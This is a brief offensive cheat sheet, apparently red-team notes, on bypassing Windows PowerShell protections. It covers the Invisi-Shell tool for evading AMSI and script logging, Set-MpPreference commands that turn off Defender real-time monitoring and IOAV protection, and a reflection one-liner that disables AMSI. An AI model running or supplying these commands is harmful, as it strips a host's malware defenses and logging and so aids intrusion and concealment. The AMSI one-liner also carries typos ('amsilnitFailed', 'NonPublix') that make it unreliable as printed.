## Tricks to Bypass protections


### AMSI Bypass
---


#### Use of `Invisi Shell`
---
From the [Tool GitHub](https://github.com/OmerYa/Invisi-Shell): _Hide your powershell script in plain sight! Invisi-Shell bypasses all of Powershell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking .Net assemblies. The hook is performed via CLR Profiler API._

- Having Admin Privileges:
```powershell
C:> RunWithPathAsAdmin.bat
```
- Non Admin:
```powershell
C:> RunWithRegistryNonAdmin.bat
```

### Disable Defender
---
Admin Privileges Required
```powershell
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -Disablerealtimemonitoring $true
"[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsilnitFailed','NonPublix,Static').SetValue($null,$true)"
```
